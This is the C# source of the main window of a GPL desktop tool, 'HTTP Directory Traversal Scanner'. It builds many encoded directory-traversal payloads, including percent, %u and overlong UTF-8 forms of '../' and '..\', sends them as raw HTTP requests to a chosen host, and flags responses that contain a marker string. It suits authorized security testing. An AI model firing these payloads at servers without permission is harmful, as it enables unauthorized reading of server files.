//This file is part of HTTP Directory Traversal Scanner.
//
//HTTP Directory Traversal Scanner is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
//HTTP Directory Traversal Scanner is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//GNU General Public License for more details.
//
//You should have received a copy of the GNU General Public License
//along with HTTP Directory Traversal Scanner.  If not, see <http://www.gnu.org/licenses/>.
using System;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.ComponentModel;
using System.Collections.ObjectModel;
using System.Collections;
using DirectoryTraversalScan.Components;

namespace DirectoryTraversalScan
{
    /// <summary>
    /// Interaction logic for Window1.xaml
    /// </summary>
    public partial class Window1 : Window, INotifyPropertyChanged
    {
        #region INotifyPropertyChanged Members

        public event PropertyChangedEventHandler PropertyChanged;

        #endregion                

        private ScanConfig _Config = new ScanConfig();
        
        public ScanConfig Config
        {
        	get { return _Config; }
        	set
        	{
                if (_Config != null)
                    _Config.FlagTextChanged -= new EventHandler(_Config_FlagTextChanged);

        		_Config = value;                
        
        		if (PropertyChanged != null)
        			PropertyChanged(this, new PropertyChangedEventArgs("Config"));

                if (_Config != null)
                    _Config.FlagTextChanged += new EventHandler(_Config_FlagTextChanged);
        	}
        }

        void _Config_FlagTextChanged(object sender, EventArgs e)
        {
            foreach (ResponseSet rs in _responses)
                foreach (Response r in rs.Responses)
                    SetResponseColor(r);
        }

        private bool _scanSettingsEnabled = true;
        
        public bool ScanSettingsEnabled
        {
        	get { return _scanSettingsEnabled; }
        	set
        	{                
        		_scanSettingsEnabled = value;
        
        		if (PropertyChanged != null)
                    PropertyChanged(this, new PropertyChangedEventArgs("ScanSettingsEnabled"));
        	}
        }

        private string _buttonText = "Scan";
        
        public string ButtonText
        {
        	get { return _buttonText; }
        	set
        	{                
        		_buttonText = value;
        
        		if (PropertyChanged != null)
        			PropertyChanged(this, new PropertyChangedEventArgs("ButtonText"));
        	}
        }

        private Thread _scan;

        private ObservableCollection<ResponseSet> _responses = new ObservableCollection<ResponseSet>();

        public ObservableCollection<ResponseSet> Responses
        {
            get { return _responses; }
        }

        private Response _selectedResponse;
        
        public Response SelectedResponse
        {
        	get { return _selectedResponse; }
        	set
        	{                
        		_selectedResponse = value;
        
        		if (PropertyChanged != null)
        			PropertyChanged(this, new PropertyChangedEventArgs("SelectedResponse"));
        	}
        }

        private int _urlNumber;
        
        public int UrlNumber
        {
        	get { return _urlNumber; }
        	set
        	{                
        		_urlNumber = value;
        
        		if (PropertyChanged != null)
                    PropertyChanged(this, new PropertyChangedEventArgs("UrlNumber"));
        	}
        }

        private int _urlCount;
        
        public int UrlCount
        {
        	get { return _urlCount; }
        	set
        	{                
        		_urlCount = value;
        
        		if (PropertyChanged != null)
        			PropertyChanged(this, new PropertyChangedEventArgs("UrlCount"));
        	}
        }

        public Window1()
        {
            InitializeComponent();

            DataContext = this;

            Title = string.Format("HTTP Directory Traversal Scanner {0} By John Leitch",
                Assembly.GetExecutingAssembly().GetName().Version);

            Application.Current.Exit += (o, e) => Config.Save();
        }        

        private void SetResponseColor(Response r)
        {
            if (r.Text.ToLower().Contains(Config.FlagText.ToLower()))
                r.BackgroundColor = new SolidColorBrush(Colors.Red);
            else
                r.BackgroundColor = new SolidColorBrush(Colors.Transparent);
        }

        private void ScanThread(object o)
        {
            int repeatCount = 16;

            var badChars = new byte[] { 0x80, (byte)'\\', (byte)'/', (byte)'.' };


            var periodOLBytes = ((byte)'.').Overlong();

            var olPeriod = ("%" + periodOLBytes[0].ToHex() + "%" + periodOLBytes[1].ToHex())
                .Repeat(2);

            var olPeriod2 = ("%u" + periodOLBytes.ToHex()).Repeat(2);

            Func<byte, string>[] responseFuncs = new Func<byte, string>[]
            {
                x => Config.Path + "/" + ("%" + x.ToHex() + "../").Repeat(repeatCount),
                x => Config.Path + "/" + ("..%" + x.ToHex() + "/").Repeat(repeatCount),
                x => Config.Path + "/" + ("%2E%2E%" + x.ToHex()).Repeat(repeatCount),
                x => Config.Path + "/" + ("..%" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + "/" + ((char)x + "../").Repeat(repeatCount),
                x => Config.Path + "/" + (".." + (char)x + "/").Repeat(repeatCount),
                x => Config.Path + "/" + ("%2E%2E%" + (char)x).Repeat(repeatCount),
                x => Config.Path + "/" + (".." + (char)x).Repeat(repeatCount),

                x => Config.Path + "/" + ("%u00" + x.ToHex() + "../").Repeat(repeatCount),
                x => Config.Path + "/" + ("..%u00" + x.ToHex() + "/").Repeat(repeatCount),
                x => Config.Path + "/" + ("%2E%2E%u00" + x.ToHex()).Repeat(repeatCount),                
                x => Config.Path + "/" + ("..%u00" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + "\\" + ("%" + x.ToHex() + "..\\").Repeat(repeatCount),
                x => Config.Path + "\\" + ("..%" + x.ToHex() + "\\").Repeat(repeatCount),
                x => Config.Path + "\\" + ("%2E%2E%" + x.ToHex()).Repeat(repeatCount),
                x => Config.Path + "\\" + ("..%" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + "\\" + ((char)x + "..\\").Repeat(repeatCount),
                x => Config.Path + "\\" + (".." + (char)x + "\\").Repeat(repeatCount),
                x => Config.Path + "\\" + ("%2E%2E%" + (char)x).Repeat(repeatCount),
                x => Config.Path + "\\" + (".." + (char)x).Repeat(repeatCount),

                x => Config.Path + "\\" + ("%u00" + x.ToHex() + "..\\").Repeat(repeatCount),
                x => Config.Path + "\\" + ("..%u00" + x.ToHex() + "\\").Repeat(repeatCount),
                x => Config.Path + "\\" + ("%2E%2E%u00" + x.ToHex()).Repeat(repeatCount),                
                x => Config.Path + "\\" + ("..%u00" + x.ToHex()).Repeat(repeatCount),     






                x => Config.Path + ("%" + x.ToHex() + "../").Repeat(repeatCount),
                x => Config.Path + ("..%" + x.ToHex() + "/").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%" + x.ToHex()).Repeat(repeatCount),
                x => Config.Path + ("..%" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + ((char)x + "../").Repeat(repeatCount),
                x => Config.Path + (".." + (char)x + "/").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%" + (char)x).Repeat(repeatCount),
                x => Config.Path + (".." + (char)x).Repeat(repeatCount),

                x => Config.Path + ("%u00" + x.ToHex() + "../").Repeat(repeatCount),
                x => Config.Path + ("..%u00" + x.ToHex() + "/").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%u00" + x.ToHex()).Repeat(repeatCount),                
                x => Config.Path + ("..%u00" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + ("%" + x.ToHex() + "..\\").Repeat(repeatCount),
                x => Config.Path + ("..%" + x.ToHex() + "\\").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%" + x.ToHex()).Repeat(repeatCount),
                x => Config.Path + ("..%" + x.ToHex()).Repeat(repeatCount),

                x => Config.Path + ((char)x + "..\\").Repeat(repeatCount),
                x => Config.Path + (".." + (char)x + "\\").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%" + (char)x).Repeat(repeatCount),
                x => Config.Path + (".." + (char)x).Repeat(repeatCount),

                x => Config.Path + ("%u00" + x.ToHex() + "..\\").Repeat(repeatCount),
                x => Config.Path + ("..%u00" + x.ToHex() + "\\").Repeat(repeatCount),
                x => Config.Path + ("%2E%2E%u00" + x.ToHex()).Repeat(repeatCount),                
                x => Config.Path + ("..%u00" + x.ToHex()).Repeat(repeatCount),     


                //x =>
                //{
                //    var ol = x.Overlong();
                //    return Config.Path + "/" + ("%" + ol[0].ToHex() + "%" + ol[1].ToHex() + olPeriod + "/").Repeat(repeatCount);
                //},
                //x =>
                //{
                //    var ol = x.Overlong();
                //    return Config.Path + "/" + (olPeriod + "%" + ol[0].ToHex() + "%" + ol[1].ToHex() + "/").Repeat(repeatCount);
                //},

                //x =>
                //{
                //    var ol = x.Overlong();
                //    return Config.Path + "/" + ("%u" + ol[0].ToHex() + ol[1].ToHex() + olPeriod2 + "/").Repeat(repeatCount);
                //},

                //x =>
                //{
                //    var ol = x.Overlong();
                //    return Config.Path + "/" + (olPeriod2 + "%u" + ol[0].ToHex() + ol[1].ToHex() + "/").Repeat(repeatCount);
                //},

                x => { var ol = x.Overlong(); return Config.Path + "/" + (olPeriod + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + ("%2E%2E" + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + (".." + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },  

                x => { var ol = x.Overlong(); return Config.Path + "/" + (olPeriod + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + ("%2E%2E" + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + (".." + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },

                x => { var ol = x.Overlong(); return Config.Path + "/" + (olPeriod2 + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + ("%2E%2E" + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "/" + (".." + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },


                x => { var ol = x.Overlong(); return Config.Path + "\\" + (olPeriod + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + ("%2E%2E" + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + (".." + "%" + ol[0].ToHex() + "%" + ol[1].ToHex()).Repeat(repeatCount); },  

                x => { var ol = x.Overlong(); return Config.Path + "\\" + (olPeriod + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + ("%2E%2E" + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + (".." + "%" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },

                x => { var ol = x.Overlong(); return Config.Path + "\\" + (olPeriod2 + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + ("%2E%2E" + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },
                x => { var ol = x.Overlong(); return Config.Path + "\\" + (".." + "%u" + ol[0].ToHex() + ol[1].ToHex()).Repeat(repeatCount); },



                //x => ("/%" + x.ToHex() + "..").Repeat(repeatCount),
                //x => ("/..%" + x.ToHex()).Repeat(repeatCount),
                //x => "/" + ("..%" + x.ToHex() ).Repeat(repeatCount),

                //x => ("/" + (char)x + "..").Repeat(repeatCount),
                //x => ("/.." + (char)x).Repeat(repeatCount),
                //x => "/" + (".." + (char)x).Repeat(repeatCount),

                //x => ("/%u00" + x.ToHex() + "..").Repeat(repeatCount),
                //x => ("/..%u00" + x.ToHex()).Repeat(repeatCount),
                //x => "/" + ("..%u00" + x.ToHex()).Repeat(repeatCount),
            };

            var commands = new[] { "GET", 
                "POST", 
                /* "HEAD", */ /* "PUT", "DELETE", */ /*"TRACE", "OPTIONS", */ /* "CONNECT", "PATCH"*/ };
            var files = new[] { null, Config.File };
            var versions = new[] { "1.0", "1.1" };
            var tails = new[] { null, ".", "?" };

            Dispatcher.Invoke(() =>
            {
                UrlNumber = 0;
                UrlCount = 
                    responseFuncs.Length * badChars.Length * 
                    commands.Length * 2 * 
                    files.Length * versions.Length * 
                    tails.Length;
            });

            int bufferSize = 8192 * 4;

            var requests = new List<string>();

            foreach (Func<byte, string> responseFunc in responseFuncs)
            //for (byte i = 0; i < 256; i++)
            foreach (byte i in badChars)
            foreach (string command in commands)
            foreach (bool relative in new bool[] { false, true })   
            foreach (var version in versions)
            foreach (string file in files)
            foreach (string tail in tails)
            {
                string path = responseFunc(i) + (file != null ? file : "");

                try
                {
                    TcpClient client = new TcpClient(Config.Host, Config.Port);
                    client.ReceiveTimeout = 8000;
                    client.SendTimeout = 8000;

                    using (NetworkStream stream = client.GetStream())
                    {
                        var resourcePath = relative ?
                            path :
                            "http://" + Config.Host + path;

                        if (tail != null)
                            resourcePath += tail;

                        var s =
                            command + " " + resourcePath + " HTTP/" + version + "\r\n" +
                            "Host: " + Config.Host + "\r\n" +
                            (command != "POST" ? "" : "Content-Length: 0\r\n") +
                            "\r\n";

                        byte[] buffer = ASCIIEncoding.ASCII.GetBytes(s);

                        stream.Write(buffer, 0, buffer.Length);

                        int len = -1;

                        string response = "";

                        bool firstResponse = true;

                        try
                        {
                            do
                            {
                                buffer = new byte[bufferSize];

                                len = stream.Read(buffer, 0, buffer.Length);

                                Array.Resize(ref buffer, len);

                                response += ASCIIEncoding.ASCII.GetString(buffer);

                                if (firstResponse)
                                {

                                    firstResponse = false;
                                }                                
                            }
                            while (len != 0);
                        }
                        catch { }                           

                        Match m = Regex.Match(response, "Date[^\n]+\n");

                        if (m.Success)
                            response = response.Remove(m.Index, m.Length);

                        var lines = response.Split('\r', '\n');

                        string firstLine = lines.Length > 0 ? lines[0] : null;

                        if (string.IsNullOrEmpty(firstLine))
                            firstLine = "[ none ]";


                        Dispatcher.BeginInvoke(() =>
                        {
                            ResponseSet responseSet = _responses
                                .SingleOrDefault(z => z.ResponseCode == firstLine);

                            if (responseSet != null)
                            {
                                Response r = responseSet.Responses
                                    .SingleOrDefault(z => z.Text == response);

                                if (r != null)
                                    r.Requests.Add(s);
                                else
                                    responseSet.Responses.Add(new Response()
                                    {
                                        Text = response,
                                        Requests = new ObservableCollection<string>() { s }
                                    });
                            }
                            else
                            {
                                var rs = new ResponseSet()
                                {
                                    ResponseCode = firstLine,
                                };
                                rs.Responses.CollectionChanged += new System.Collections.Specialized.NotifyCollectionChangedEventHandler(Responses_CollectionChanged);
                                rs.Responses.Add(new Response()
                                {
                                    Text = response,
                                    Requests = new ObservableCollection<string>() { s }
                                });

                                _responses.Add(rs);
                            }

                            UrlNumber++;
                        });

                        Console.Write(".");
                    }
                }
                catch (Exception e)
                {
                    
                    if (!_scanSettingsEnabled && e is SocketException)
                    {
                        MessageBox.Show(e.Message);
                    }
                    Console.WriteLine(e.ToString());
                }                    
            }

            Dispatcher.Invoke(() =>
            {
                ScanSettingsEnabled = true;

                ButtonText = "Scan";
            });
        }

        void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            var c = ScanConfig.Load();

            if (c != null)
                Config = c;
        }

        private void Tree_SelectedItemChanged(object sender, RoutedPropertyChangedEventArgs<object> e)
        {
            SelectedResponse = e.NewValue as Response;
        }

        private void ScanButton_Click(object sender, RoutedEventArgs e)
        {
            if (ScanSettingsEnabled)
            {
                ScanSettingsEnabled = false;

                ButtonText = "Stop";

                Responses.Clear();

                _scan = new Thread(ScanThread) { IsBackground = true };
                _scan.Start();
            }
            else
            {
                ScanSettingsEnabled = true;

                ButtonText = "Scan";

                _scan.Abort();
            }
        }

        void Responses_CollectionChanged(object sender, System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        {
            if (e.NewItems != null)
                foreach (Response r in (e.NewItems))
                    SetResponseColor(r);
        }
    }
}
